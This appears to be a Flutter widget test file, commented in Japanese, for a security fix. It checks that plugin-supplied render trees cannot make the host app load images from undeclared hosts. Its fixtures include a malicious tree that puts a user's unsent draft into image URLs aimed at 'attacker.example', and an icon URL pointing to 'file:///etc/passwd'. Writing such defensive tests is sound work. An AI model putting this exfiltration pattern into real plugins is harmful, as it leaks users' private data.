// D-407 (セキュリティ指摘 #9): プラグインの RRL からホストが勝手に通信しない。
// 制限モード / `network` を持たないプラグインの面では、`Image` の `src`・アバター・メディア・アクションのアイコンなど
// 木の下で URL を読む部品はすべて読まない(= 通信しない)。`network` + 宣言した接続先があるときだけ、その先を読む。
import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:rasq_design/rasq_design.dart';
import 'package:rrl_core/rrl_core.dart';
import 'package:rrl_renderer/rrl_renderer.dart';

Widget wrap(Widget child) => MaterialApp(
      theme: RasqTheme.light(),
      home: Scaffold(body: SingleChildScrollView(child: SizedBox(width: 400, child: child))),
    );

/// 木の下で作られた NetworkImage / RasqPolicyNetworkImage の URL(= ホストが送ろうとする通信)。
List<String> networkUrls(WidgetTester tester) => [
      for (final img in tester.widgetList<Image>(find.byType(Image)))
        if (img.image case final NetworkImage n)
          n.url
        else if (img.image case final RasqPolicyNetworkImage n)
          n.url.toString(),
    ];

/// リダイレクトを各ホップで確かめる読み方 (セキュリティ確認 2026-10-09 の [11]) の URL。
List<String> policedUrls(WidgetTester tester) => [
      for (final img in tester.widgetList<Image>(find.byType(Image)))
        if (img.image case final RasqPolicyNetworkImage n) n.url.toString(),
    ];

const _draft = 'まだ投稿していない下書き';
final _exfil = 'https://attacker.example/c.png?d=${Uri.encodeComponent(_draft)}';

/// 下書きを URL に入れた、悪意のある木(L1 Image + L2 Avatar / MediaGrid / ActionBar / UserRow / RichText の画像)。
RrlNode exfilTree() => RrlNode.fromJson({
      't': 'Column',
      'c': [
        {
          't': 'Image',
          'p': {'src': _exfil},
        },
        {
          't': 'Avatar',
          'p': {
            'user': {'displayName': 'x', 'handle': 'x', 'avatarUrl': '$_exfil&a'},
          },
        },
        {
          't': 'UserRow',
          'p': {
            'user': {'displayName': 'y', 'handle': 'y', 'avatarUrl': '$_exfil&u'},
          },
        },
        {
          't': 'MediaGrid',
          'p': {
            'media': [
              {'id': 'm', 'type': 'image', 'url': '$_exfil&m', 'thumbnailUrl': '$_exfil&t'},
            ],
          },
        },
        {
          't': 'ActionBar',
          'p': {
            'actions': [
              {'id': 'a', 'label': 'a', 'icon': 'star'},
            ],
            'states': {
              'a': {'iconUrl': '$_exfil&i'},
            },
          },
        },
        {
          't': 'ActionBar',
          'p': {
            'actions': [
              {'id': 'f', 'label': 'f', 'icon': 'star'},
            ],
            'states': {
              'f': {'iconUrl': 'file:///etc/passwd'},
            },
          },
        },
      ],
    });

RrlHost hostWith(RasqMediaPolicy? policy) => policy == null
    ? RrlHost(instanceScope: 'evil:x:0.0.1:i', scope: RrlScope({}))
    : RrlHost(instanceScope: 'evil:x:0.0.1:i', scope: RrlScope({}), mediaPolicy: policy);

void main() {
  testWidgets('既定(端末内だけ)では、下書きを入れた URL をどの部品も読まない', (tester) async {
    await tester.pumpWidget(wrap(RrlRenderer(node: exfilTree(), host: hostWith(null))));
    await tester.pump();
    expect(networkUrls(tester), isEmpty);
    expect(find.byWidgetPredicate((w) => w is Image && w.image is FileImage), findsNothing);
    expect(find.textContaining('image blocked'), findsOneWidget);
  });

  testWidgets('localOnly でも data: の画像は出る', (tester) async {
    // 1x1 の透明 PNG。
    const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
    final node = RrlNode.fromJson({
      't': 'Image',
      'p': {'src': 'data:image/png;base64,$png'},
    });
    await tester.pumpWidget(wrap(RrlRenderer(node: node, host: hostWith(RasqMediaPolicy.localOnly))));
    expect(find.byWidgetPredicate((w) => w is Image && w.image is MemoryImage), findsOneWidget);
  });

  testWidgets('network + 宣言した接続先: その先だけ読み、ほかは読まない', (tester) async {
    final policy = RasqMediaPolicy.plugin(hostAllowed: (h) => h == 'cdn.allowed.example');
    final node = RrlNode.fromJson({
      't': 'Column',
      'c': [
        {
          't': 'Image',
          'p': {'src': 'https://cdn.allowed.example/ok.png'},
        },
        {
          't': 'Image',
          'p': {'src': _exfil},
        },
        {
          't': 'Avatar',
          'p': {
            'user': {'displayName': 'x', 'handle': 'x', 'avatarUrl': 'https://cdn.allowed.example/a.png'},
          },
        },
      ],
    });
    await tester.pumpWidget(wrap(RrlRenderer(node: node, host: hostWith(policy))));
    await tester.pump();
    expect(networkUrls(tester), unorderedEquals(['https://cdn.allowed.example/ok.png', 'https://cdn.allowed.example/a.png']));
    // プラグインが選んだ URL は、リダイレクトの各ホップを方針で確かめる読み方で読む(ふつうの NetworkImage にしない)。
    expect(policedUrls(tester), unorderedEquals(['https://cdn.allowed.example/ok.png', 'https://cdn.allowed.example/a.png']));
  });

  testWidgets('ホストが渡した URL(allowedUrls、完全一致)だけは読む', (tester) async {
    const given = 'https://media.sns.example/avatar.png';
    final node = RrlNode.fromJson({
      't': 'Column',
      'c': [
        {
          't': 'Avatar',
          'p': {
            'user': {'displayName': 'x', 'handle': 'x', 'avatarUrl': given},
          },
        },
        {
          't': 'Image',
          'p': {'src': '$given?d=leak'},
        },
      ],
    });
    await tester.pumpWidget(wrap(RrlRenderer(node: node, host: hostWith(const RasqMediaPolicy.plugin(allowedUrls: {given})))));
    await tester.pump();
    expect(networkUrls(tester), [given]);
    expect(policedUrls(tester), isEmpty); // ホストが渡した URL はこれまでどおり
  });

  testWidgets('ホストの見本(unrestricted)は従来どおり読む', (tester) async {
    await tester.pumpWidget(wrap(RrlRenderer(node: exfilTree(), host: hostWith(RasqMediaPolicy.unrestricted))));
    await tester.pump();
    expect(networkUrls(tester), contains(_exfil));
    expect(policedUrls(tester), isEmpty);
  });

  test('RasqMediaPolicy.allows: スキームと接続先', () {
    const local = RasqMediaPolicy.localOnly;
    expect(local.allows(Uri.parse('data:image/png;base64,AA==')), isTrue);
    expect(local.allows(Uri.parse('https://a.example/x')), isFalse);
    expect(local.allows(Uri.parse('file:///etc/passwd')), isFalse);
    expect(local.allows(null), isFalse);
    final net = RasqMediaPolicy.plugin(hostAllowed: (h) => h == 'a.example');
    expect(net.allows(Uri.parse('https://a.example/x')), isTrue);
    expect(net.allows(Uri.parse('https://b.example/x')), isFalse);
    expect(net.allows(Uri.parse('ftp://a.example/x')), isFalse);
    expect(net.allows(Uri.parse('file:///a.example')), isFalse);
    expect(RasqMediaPolicy.unrestricted.allows(Uri.parse('https://b.example/x')), isTrue);
  });
}
